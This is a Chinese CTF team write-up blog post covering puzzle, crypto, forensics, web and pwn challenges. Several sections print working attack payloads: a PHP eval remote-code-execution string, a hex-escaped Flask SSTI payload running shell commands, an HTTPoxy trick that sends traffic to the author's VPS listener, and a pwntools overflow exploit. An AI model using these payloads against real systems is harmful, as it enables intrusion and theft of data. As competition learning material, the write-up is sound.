@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup" />
+<meta property="og:description" content="0x00 前言 0x01 八卦迷宫 一起走迷宫吧，要提交全拼音字符奥 走迷宫，将八卦转成字符为cazy{战长恙长战恙河长山山安战疫疫战疫安疫长安恙}，再进一步转成" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-08T13:45:02+00:00" />
+<meta property="article:modified_time" content="2022-01-08T13:45:02+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup"/>
+<meta name="twitter:description" content="0x00 前言 0x01 八卦迷宫 一起走迷宫吧，要提交全拼音字符奥 走迷宫，将八卦转成字符为cazy{战长恙长战恙河长山山安战疫疫战疫安疫长安恙}，再进一步转成"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/" /><link rel="prev" href="https://hannibal0x.github.io/2022-01-06-%E7%AB%AF%E7%82%B9%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%88%98%E6%9C%AF%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" /><link rel="next" href="https://hannibal0x.github.io/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup\/"
+        },"genre": "posts","keywords": "CTF","wordcount":  1877 ,
+        "url": "https:\/\/hannibal0x.github.io\/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup\/","datePublished": "2022-01-08T13:45:02+00:00","dateModified": "2022-01-08T13:45:02+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>WriteUp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-08">2022-01-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1877 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-八卦迷宫">0x01 八卦迷宫</a></li>
+    <li><a href="#0x02-rce_no_para">0x02 RCE_No_Para</a></li>
+    <li><a href="#0x03-西安加油">0x03 西安加油</a></li>
+    <li><a href="#0x04-no_cry_no_can">0x04 no_cry_no_can</a></li>
+    <li><a href="#0x05-no_can_no_bb">0x05 no_can_no_bb</a></li>
+    <li><a href="#0x06-朴实无华的取证">0x06 朴实无华的取证</a></li>
+    <li><a href="#0x07-binary">0x07 binary</a></li>
+    <li><a href="#0x08-flask">0x08 Flask</a></li>
+    <li><a href="#0x09-flag配送中心">0x09 Flag配送中心</a></li>
+    <li><a href="#0x0a-pwn1">0x0A pwn1</a></li>
+    <li><a href="#0x0b-combat_slogan">0x0B combat_slogan</a></li>
+    <li><a href="#0x0c-cute_doge">0x0C cute_doge</a></li>
+    <li><a href="#0x0d-hello_py">0x0D hello_py</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-前言">0x00 前言</h2>
+<div class="wp-block-image">
+  <figure class="aligncenter"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-39.png" alt="" class="wp-image-4877" /></figure>
+</div>
+<div class="wp-block-image">
+  <figure class="aligncenter size-full is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-40.png" alt="" class="wp-image-4879" width="792" height="293" /></figure>
+</div>
+<h2 id="0x01-八卦迷宫">0x01 八卦迷宫</h2>
+<p><code>一起走迷宫吧，要提交全拼音字符奥</code><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="2896" height="1856" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-35.png" alt="" class="wp-image-4867" /> </figure></p>
+<p>走迷宫，将八卦转成字符为cazy{战长恙长战恙河长山山安战疫疫战疫安疫长安恙}，再进一步转成拼音<code>cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}</code></p>
+<h2 id="0x02-rce_no_para">0x02 RCE_No_Para</h2>
+<pre class="wp-block-code"><code> &lt;?php
+if(';' === preg_replace('/&#91;^\W]+\((?R)?\)/', '', $_GET&#91;'code'])) { 
+    if(!preg_match('/session|end|next|header|dir/i',$_GET&#91;'code'])){
+        eval($_GET&#91;'code']);
+    }else{
+        die("Hacker!");
+    }
+}else{
+    show_source(__FILE__);
+}
+?&gt; </code></pre>
+<p>我们可以通过传递的参数来进行RCE，<code>get_defined_vars()</code>，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
+<p><code>a=phpinfo();&amp;code=eval(current(current(get_defined_var</code> <code>())));</code> <figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="2266" height="1888" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-37.png" alt="" class="wp-image-4870" /> </figure></p>
+<p>构造<code>a=system('cat flag.php');&amp;code=eval(current(current(get_defined_vars())));</code><figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-36.png" alt="" class="wp-image-4869" width="501" height="86" /> </figure></p>
+<h2 id="0x03-西安加油">0x03 西安加油</h2>
+<p>用wireshark打开pcap文件，追踪tcp流，在<code>tcp.stream eq 6</code>时，发现出现secret.txt的字样和一大串疑似base64的字符。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1730" height="1113" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-43.png" alt="" class="wp-image-4882" /> </figure></p>
+<p>把字符提取出来，放到cyberchef里面，解密后疑似zip压缩包。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1444" height="658" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-41.png" alt="" class="wp-image-4880" /> </figure></p>
+<p>解压后得到48张照片，拼好就可以得到flag。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1444" height="483" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-42.png" alt="" class="wp-image-4881" /> </figure></p>
+<p>这个比较简单，直接开了个ppt手撕，得到cazy{make_XiAN_great_Again}。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="555" height="349" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-44.png" alt="" class="wp-image-4883" /> </figure></p>
+<h2 id="0x04-no_cry_no_can">0x04 no_cry_no_can</h2>
+<pre class="wp-block-code"><code>from Crypto.Util.number import*
+from secret import flag,key
+
+assert len(key) &lt;= 5
+assert flag&#91;:5] == b'cazy{'
+def can_encrypt(flag,key):
+    block_len = len(flag) // len(key) + 1
+    new_key = key * block_len
+    return bytes(&#91;i^j for i,j in zip(flag,new_key)])
+
+c = can_encrypt(flag,key)
+print(c)
+
+# b'&lt;pH\x86\x1a&"m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l'</code></pre>
+<p>阅读代码可知，flag的前5个字符是cazy{，该算法会把key的长度进行填充，然后逐一与flag的字符进行异或，得到密文，而且key的长度是小于等于5的，所以我们可以通过密文前5个字符与flag前5个字符进行异或，求出key值，密文的长度是26，而flag的长度绝对不超过26，可以把key值进行填充，与密文逐一异或，即可求出flag。</p>
+<p>脚本如下：</p>
+<pre class="wp-block-code"><code>flag_head = b'cazy{'
+c_head = b'&lt;pH\x86\x1a'
+key_max = (bytes(&#91;i^j for i,j in zip(flag_head,c_head)]))
+print('key_max:',key_max)
+c = b'&lt;pH\x86\x1a&"m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l'
+block_len = len(c)// len(key_max) + 1
+new_key = key_max * block_len
+print('new_key:',new_key)
+flag = (bytes(&#91;i^j for i,j in zip(c,new_key)]))
+print('flag:',flag)</code></pre><figure class="wp-block-image size-full">
+<p><img loading="lazy" width="1384" height="126" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-45.png" alt="" class="wp-image-4884" /> </figure></p>
+<p>最终的flag为：<code>cazy{y3_1s_a_h4nds0me_b0y!}</code></p>
+<h2 id="0x05-no_can_no_bb">0x05 no_can_no_bb</h2>
+<pre class="wp-block-code"><code>import random
+from Crypto.Util.number import long_to_bytes
+from Crypto.Cipher import AES
+from secret import flag
+
+assert flag&#91;:5] ==b'cazy{'
+
+def pad(m):
+    tmp = 16-(len(m)%16)
+    return m + bytes(&#91;tmp for _ in range(tmp)])
+
+def encrypt(m,key):
+    aes = AES.new(key,AES.MODE_ECB)
+    return aes.encrypt(m)
+
+if __name__ == "__main__":
+    flag = pad(flag)
+    key = pad(long_to_bytes(random.randrange(1,1&lt;&lt;20)))
+    c = encrypt(flag,key)
+    print(c)
+# b'\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c'</code></pre>
+<p>这道题的求解关键在于key值，它是从1到1048576中随机生成的一个数经过pad()函数处理得到的结果，可以发现这个范围并不是很大，可以直接暴力破解出来。</p>
+<p>解密脚本如下：</p>
+<pre class="wp-block-code"><code>from Crypto.Util.number import long_to_bytes
+from Crypto.Cipher import AES
+
+def pad(m):
+    tmp = 16-(len(m)%16)
+    return m + bytes(&#91;tmp for _ in range(tmp)])
+
+def decrypt(m,key):
+    aes = AES.new(key,AES.MODE_ECB)
+    return aes.decrypt(m)
+
+if __name__ == "__main__":
+    c = b'\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c'
+    for i in range(1,1&lt;&lt;20):
+        key = pad(long_to_bytes(i))
+        flag = decrypt(c,key)
+        if b'cazy{' in flag:
+            print(flag)</code></pre>
+<p>稍等几秒钟就能跑出结果。flag为<code>cazy{n0_c4n,bb?n0p3!}</code><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1377" height="70" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-46.png" alt="" class="wp-image-4885" /> </figure></p>
+<h2 id="0x06-朴实无华的取证">0x06 朴实无华的取证</h2>
+<p>查看镜像信息<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1379" height="422" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-47.png" alt="" class="wp-image-4886" /> </figure></p>
+<p>filescan搜索一下txt文件，发现一个日记很可疑啊。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1385" height="100" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-48.png" alt="" class="wp-image-4887" /> </figure></p>
+<p>导出查看，发现个很像密钥的玩意儿，<code>20211209</code>。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-49.png" alt="" class="wp-image-4888" width="388" height="72" /> </figure></p>
+<p>搜索图片，发现一个flag文件。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1387" height="577" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-50.png" alt="" class="wp-image-4889" /> </figure></p>
+<p>导出查看一下，得到一串离谱的字母<code>FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]</code><figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-51.png" alt="" class="wp-image-4890" width="489" height="335" /> </figure></p>
+<p>再搜索关键字桌面，找到flag.zip的压缩包。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1387" height="304" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-52.png" alt="" class="wp-image-4891" /> </figure></p>
+<p>解压后查看发现和加密有关，foremost分离一下。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1384" height="177" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-53.png" alt="" class="wp-image-4892" /> </figure></p>
+<p>得到一段加密代码</p>
+<pre class="wp-block-code"><code>//幼儿园水平的加密（部分）
+void Encrypt(string& str)
+{
+        for(int i = 0; i &lt; str.length(); i++)
+        {
+                if(str&#91;i] &gt;='a'&& str&#91;i]&lt;='w')
+                        str&#91;i]+=3;
+                else if(str&#91;i]=='x')
+                        str&#91;i]='a';
+                else if(str&#91;i]=='y')
+                        str&#91;i]='b';
+                else if(str&#91;i]=='z')
+                        str&#91;i]='c';        
+                else if(str&#91;i]=='_')
+                        str&#91;i]='|';
+                str&#91;i] -= 32;
+        }
+}</code></pre>
+<p>用大班水平的代码能力编写如下脚本：</p>
+<pre class="wp-block-code"><code>s1 = 'FDCB&#91;8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]'
+
+flag = ''
+for i in range(len(s1)):
+        k = chr(ord(s1&#91;i])+32)
+        if chr(ord(k)-3) &gt;='a'and chr(ord(k)-3)&lt;='w':
+                k = chr(ord(k)-3)
+        elif(k == 'a'):
+                k ='x';
+        elif(k == 'b'):
+                k = 'y';
+        elif(k == 'c'):
+                k = 'z';        
+        elif(k == '|'):
+                k = '_';
+        flag += k
+print (flag)</code></pre>
+<p>最后得到<code>cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}</code><figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-54.png" alt="" class="wp-image-4893" width="565" height="34" /> </figure></p>
+<h2 id="0x07-binary">0x07 binary</h2>
+<p>使用jadx打开234文件，可以看到java代码。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1656" height="666" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-55.png" alt="" class="wp-image-4895" /> </figure></p>
+<p>将byte数组转成ascii码，再转base64，得到一大串的01，感觉是二维码，上脚本。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1034" height="905" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-56.png" alt="" class="wp-image-4896" /> </figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">zlib</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">MAX</span> <span class="o">=</span> <span class="mi">37</span>
+</span></span><span class="line"><span class="cl"><span class="n">pic</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&#34;RGB&#34;</span><span class="p">,(</span><span class="n">MAX</span><span class="p">,</span><span class="n">MAX</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span><span class="s2">&#34;0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">i</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">MAX</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">MAX</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nb">str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pic</span><span class="o">.</span><span class="n">putpixel</span><span class="p">([</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">],(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span><span class="n">pic</span><span class="o">.</span><span class="n">putpixel</span><span class="p">([</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">],(</span><span class="mi">255</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="mi">255</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">pic</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s2">&#34;flag.png&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后得到图片，扫描得到<code>flag{932b2c0070e4897ea7df0190dbf36ece}</code><figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-57.png" alt="" class="wp-image-4897" width="143" height="142" /> </figure></p>
+<h2 id="0x08-flask">0x08 Flask</h2>
+<p>给了hint<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-58.png" alt="" class="wp-image-4898" width="550" height="185" /> </figure></p>
+<p>利用.js?作为后缀绕过重定向，进入admin路由<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1411" height="492" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-59.png" alt="" class="wp-image-4899" /> </figure></p>
+<p>根据提示admin/?name=找到ssti入口</p>
+<p>测试了下存在过滤了__,subclasses,[,],builtins,args等</p>
+<p>中括号通过attr的过滤器绕过，字符串以及下划线过滤用16进制绕过，</p>
+<p>最终payload</p>
+<pre class="wp-block-code"><code>/admin?name={{lipsum"attr('\x5f\x5fglobals\x5f\x5f')"attr('get')
+('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')"attr('get')('eval')
+('\x5f\x5fimport\x5f\x5f("os").popen("cat%20flag").read()')}}.js?</code></pre><figure class="wp-block-image size-full">
+<p><img loading="lazy" width="1352" height="435" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-60.png" alt="" class="wp-image-4900" /> </figure></p>
+<h2 id="0x09-flag配送中心">0x09 Flag配送中心</h2>
+<p>考点HTTPoxy漏洞(CVE-2016-5385)</p>
+<p>报文中加个proxy:http://vps:2333<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-61.png" alt="" class="wp-image-4901" width="583" height="351" /> </figure></p>
+<p>在自己vps上监听该端口</p>
+<p>nc-lvp2333</p>
+<p>发个请求</p>
+<p>接收到flag<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-62.png" alt="" class="wp-image-4902" width="595" height="271" /> </figure></p>
+<h2 id="0x0a-pwn1">0x0A pwn1</h2>
+<figure class="wp-block-image size-full">
+<p><img loading="lazy" width="1385" height="280" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-64.png" alt="" class="wp-image-4904" /></figure></p>
+<pre class="wp-block-code"><code>from pwn import *
+# sh = process('pwn1')
+sh = remote("113.201.14.253",16088)
+vul_addr = 0x08048540
+gift = sh.recv()&#91;5:15]
+gift = int(gift,16)
+print(hex(gift))
+payload = b'a'*(52)+p32(gift+0x50)+b"a"*20+p32(vul_addr)
+# input()
+sh.send(payload)
+sh.interactive()</code></pre><figure class="wp-block-image size-full is-resized">
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-65.png" alt="" class="wp-image-4905" width="705" height="593" /> </figure></p>
